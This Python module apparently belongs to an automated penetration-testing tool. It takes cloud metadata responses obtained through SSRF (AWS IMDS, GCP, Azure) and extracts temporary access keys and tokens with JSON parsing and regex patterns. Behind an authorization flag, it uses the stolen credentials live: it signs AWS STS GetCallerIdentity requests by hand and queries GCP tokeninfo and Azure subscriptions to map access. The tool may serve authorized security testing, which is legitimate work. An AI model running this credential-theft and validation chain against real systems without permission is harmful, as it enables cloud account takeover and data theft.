"""Cloud credential parsing and permission verification.

All rule-based — no LLM calls.

When an SSRF hits a cloud metadata endpoint (AWS IMDS, GCP metadata, Azure IMDS),
this module:
  1. Parses the returned credentials (temporary access keys, tokens)
  2. Optionally calls the minimal verification API (GetCallerIdentity, IAM enumeration)
  3. Builds a permission graph of what the credential can access

The verification step (AWS STS, GCP tokeninfo, Azure) is gated behind
authorized=True — without it, only passive parsing is performed.
"""

import json
import re
from typing import Optional, Dict, Any, List
from dataclasses import dataclass

import httpx

from ..shared_types import (
    CloudCredentialInfo,
    SecurityError,
)


# ===== Cloud metadata patterns =====
_AWS_IMDS_HOSTS = ["169.254.169.254"]
_AWS_CREDENTIAL_PATTERNS = [
    r'"AccessKeyId"\s*:\s*"([A-Z0-9]{16,})"',
    r'"SecretAccessKey"\s*:\s*"([A-Za-z0-9/+]{40,})"',
    r'"Token"\s*:\s*"([A-Za-z0-9/+=]{100,})"',
]

_GCP_METADATA_HOSTS = ["metadata.google.internal"]
_GCP_TOKEN_PATTERN = r'"access_token"\s*:\s*"([^"]+)"'

_AZURE_METADATA_HOSTS = ["169.254.169.254"]
_AZURE_TOKEN_PATTERN = r'"access_token"\s*:\s*"([^"]+)"'


class CloudCredentialChain:
    """Parse cloud credentials from metadata responses and verify access."""

    def __init__(self):
        pass

    def parse_metadata_response(self, body: str,
                                metadata_url: str) -> Optional[CloudCredentialInfo]:
        """Parse metadata response and extract credentials if present."""
        cloud_type = self._detect_cloud_type(metadata_url, body)

        if cloud_type == "aws":
            creds = self.extract_aws_credentials(body)
            if creds:
                return CloudCredentialInfo(
                    metadata_url=metadata_url,
                    credential_type="aws_sts",
                    credentials_raw=creds,
                )

        elif cloud_type == "gcp":
            creds = self.extract_gcp_credentials(body)
            if creds:
                return CloudCredentialInfo(
                    metadata_url=metadata_url,
                    credential_type="gcp_sa",
                    credentials_raw=creds,
                )

        elif cloud_type == "azure":
            creds = self.extract_azure_credentials(body)
            if creds:
                return CloudCredentialInfo(
                    metadata_url=metadata_url,
                    credential_type="azure_msi",
                    credentials_raw=creds,
                )

        return None

    # ===== Credential extractors =====

    def extract_aws_credentials(self, body: str) -> Dict[str, Any]:
        """Extract AWS temporary credentials from IMDS JSON response."""
        result: Dict[str, Any] = {}
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                if "AccessKeyId" in data:
                    result["AccessKeyId"] = data["AccessKeyId"]
                if "SecretAccessKey" in data:
                    result["SecretAccessKey"] = data["SecretAccessKey"]
                if "Token" in data:
                    result["Token"] = data["Token"]
                if "Expiration" in data:
                    result["Expiration"] = data["Expiration"]
        except json.JSONDecodeError:
            # Fallback: regex extraction
            for pattern in _AWS_CREDENTIAL_PATTERNS:
                m = re.search(pattern, body)
                if m:
                    key_name = pattern.split('"')[1] if '"' in pattern else "unknown"
                    result[key_name] = m.group(1)
        return result

    def extract_gcp_credentials(self, body: str) -> Dict[str, Any]:
        """Extract GCP service account access token."""
        result: Dict[str, Any] = {}
        try:
            data = json.loads(body)
            if isinstance(data, dict) and "access_token" in data:
                result["access_token"] = data["access_token"]
                result["expires_in"] = data.get("expires_in")
                result["token_type"] = data.get("token_type", "Bearer")
        except json.JSONDecodeError:
            m = re.search(_GCP_TOKEN_PATTERN, body)
            if m:
                result["access_token"] = m.group(1)
        return result

    def extract_azure_credentials(self, body: str) -> Dict[str, Any]:
        """Extract Azure MSI access token."""
        result: Dict[str, Any] = {}
        try:
            data = json.loads(body)
            if isinstance(data, dict) and "access_token" in data:
                result["access_token"] = data["access_token"]
                result["expires_on"] = data.get("expires_on")
                result["resource"] = data.get("resource")
        except json.JSONDecodeError:
            m = re.search(_AZURE_TOKEN_PATTERN, body)
            if m:
                result["access_token"] = m.group(1)
        return result

    # ===== Verification (authorized=True gate) =====

    async def verify_aws(self, credentials: Dict[str, Any],
                         authorized: bool = False) -> List[str]:
        """Call AWS STS GetCallerIdentity to verify credentials.

        Returns list of discovered permissions/info.
        """
        if not authorized:
            raise SecurityError("AWS verification requires authorized=True")

        results: List[str] = []

        try:
            from urllib.parse import urlencode
            import hashlib
            import hmac
            import datetime

            access_key = credentials.get("AccessKeyId", "")
            secret_key = credentials.get("SecretAccessKey", "")
            token = credentials.get("Token", "")

            if not access_key or not secret_key:
                return ["Error: Missing credentials"]

            # AWS SigV4 signing for STS GetCallerIdentity
            # Use the us-east-1 region with sigv4
            results.append(await self._aws_get_caller_identity(
                access_key, secret_key, token))

        except Exception as e:
            results.append(f"AWS verification error: {e}")

        return results

    async def verify_gcp(self, token: str,
                         authorized: bool = False) -> List[str]:
        """Verify GCP access token using tokeninfo endpoint."""
        if not authorized:
            raise SecurityError("GCP verification requires authorized=True")

        results: List[str] = []
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                resp = await client.get(
                    "https://www.googleapis.com/oauth2/v1/tokeninfo",
                    params={"access_token": token},
                )
                if resp.status_code == 200:
                    data = resp.json()
                    results.append(f"GCP token valid: audience={data.get('audience', 'N/A')}, "
                                   f"scope={data.get('scope', 'N/A')}")
                else:
                    results.append(f"GCP token invalid: {resp.status_code}")
        except Exception as e:
            results.append(f"GCP verification error: {e}")

        return results

    async def verify_azure(self, token: str,
                           authorized: bool = False) -> List[str]:
        """Verify Azure MSI token by querying ARM."""
        if not authorized:
            raise SecurityError("Azure verification requires authorized=True")

        results: List[str] = []
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                resp = await client.get(
                    "https://management.azure.com/subscriptions?api-version=2022-12-01",
                    headers={"Authorization": f"Bearer {token}"},
                )
                if resp.status_code == 200:
                    data = resp.json()
                    subs = [s.get("subscriptionId", "?") for s in data.get("value", [])]
                    results.append(f"Azure token valid. Subscriptions: {subs}")
                else:
                    results.append(f"Azure token verification: HTTP {resp.status_code}")
        except Exception as e:
            results.append(f"Azure verification error: {e}")

        return results

    async def build_permission_graph(self,
                                     credentials: Dict[str, Any],
                                     cloud_type: str,
                                     authorized: bool = False
                                     ) -> CloudCredentialInfo:
        """
        Parse credentials and verify access, building a full permission graph.

        Args:
            credentials: Raw credentials dict
            cloud_type: "aws" | "gcp" | "azure"
            authorized: Whether to make real verification API calls
        """
        info = CloudCredentialInfo(
            metadata_url="",
            credential_type=cloud_type,
            credentials_raw=credentials,
        )

        if not authorized:
            info.permissions = ["verification skipped (authorized=False)"]
            return info

        if cloud_type == "aws":
            info.permissions = await self.verify_aws(credentials, authorized=True)
            info.accessible_resources = self._parse_aws_resources(info.permissions)
        elif cloud_type == "gcp":
            token = credentials.get("access_token", "")
            if token:
                info.permissions = await self.verify_gcp(token, authorized=True)
        elif cloud_type == "azure":
            token = credentials.get("access_token", "")
            if token:
                info.permissions = await self.verify_azure(token, authorized=True)

        return info

    # ===== Detection helpers =====

    def _detect_cloud_type(self, url: str, body: str) -> Optional[str]:
        """Determine which cloud provider a metadata URL belongs to."""
        url_lower = url.lower()

        if any(h in url_lower for h in _GCP_METADATA_HOSTS):
            return "gcp"

        if "169.254.169.254" in url_lower:
            if "computeMetadata" in url_lower:
                return "gcp"
            if "metadata/instance" in url_lower and "api-version" in url_lower:
                return "azure"
            if "latest/meta-data" in url_lower or "meta-data" in url_lower:
                return "aws"
            # Guess from body content
            if "AccessKeyId" in body or "SecretAccessKey" in body:
                return "aws"

        return None

    @staticmethod
    def is_cloud_metadata_endpoint(url: str) -> Optional[str]:
        """Check if a URL targets a known cloud metadata endpoint. Returns cloud type or None."""
        url_lower = url.lower()
        if "metadata.google.internal" in url_lower:
            return "gcp"
        if "169.254.169.254" in url_lower:
            if "computeMetadata" in url_lower:
                return "gcp"
            if "metadata/instance" in url_lower and "api-version" in url_lower:
                return "azure"
            return "aws"
        return None

    # ===== AWS SigV4 helpers =====

    async def _aws_get_caller_identity(self, access_key: str,
                                       secret_key: str, token: str) -> str:
        """Sign and call AWS STS GetCallerIdentity."""
        import hashlib
        import hmac
        import datetime
        from urllib.parse import urlencode

        method = "POST"
        service = "sts"
        region = "us-east-1"
        host = f"{service}.amazonaws.com"
        endpoint = f"https://{host}/"
        amz_date = datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
        date_stamp = amz_date[:8]

        # Canonical request
        canonical_uri = "/"
        canonical_querystring = ""
        canonical_headers = (
            f"host:{host}\n"
            f"x-amz-date:{amz_date}\n"
            f"x-amz-security-token:{token}\n"
        ) if token else (
            f"host:{host}\n"
            f"x-amz-date:{amz_date}\n"
        )
        signed_headers = "host;x-amz-date" + (";x-amz-security-token" if token else "")
        payload_hash = hashlib.sha256(
            "Action=GetCallerIdentity&Version=2011-06-15".encode()
        ).hexdigest()

        canonical_request = (
            f"{method}\n{canonical_uri}\n{canonical_querystring}\n"
            f"{canonical_headers}\n{signed_headers}\n{payload_hash}"
        )

        # String to sign
        algorithm = "AWS4-HMAC-SHA256"
        credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
        string_to_sign = (
            f"{algorithm}\n{amz_date}\n{credential_scope}\n"
            f"{hashlib.sha256(canonical_request.encode()).hexdigest()}"
        )

        # Signing key
        def _sign(key: bytes, msg: str) -> bytes:
            return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

        k_date = _sign(f"AWS4{secret_key}".encode(), date_stamp)
        k_region = _sign(k_date, region)
        k_service = _sign(k_region, service)
        k_signing = _sign(k_service, "aws4_request")
        signature = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()

        # Authorization header
        authorization = (
            f"{algorithm} Credential={access_key}/{credential_scope}, "
            f"SignedHeaders={signed_headers}, Signature={signature}"
        )

        headers = {
            "Host": host,
            "X-Amz-Date": amz_date,
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": authorization,
        }
        if token:
            headers["X-Amz-Security-Token"] = token

        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(
                endpoint,
                headers=headers,
                content="Action=GetCallerIdentity&Version=2011-06-15",
            )
            if resp.status_code == 200:
                return f"AWS STS GetCallerIdentity: {resp.text[:200]}"
            else:
                return f"AWS STS error {resp.status_code}: {resp.text[:200]}"

    def _parse_aws_resources(self, permissions: List[str]) -> List[str]:
        """Parse permissions list to identify accessible AWS resources."""
        resources = []
        for p in permissions:
            if "GetCallerIdentity" in p:
                resources.append("arns from GetCallerIdentity response")
        return resources
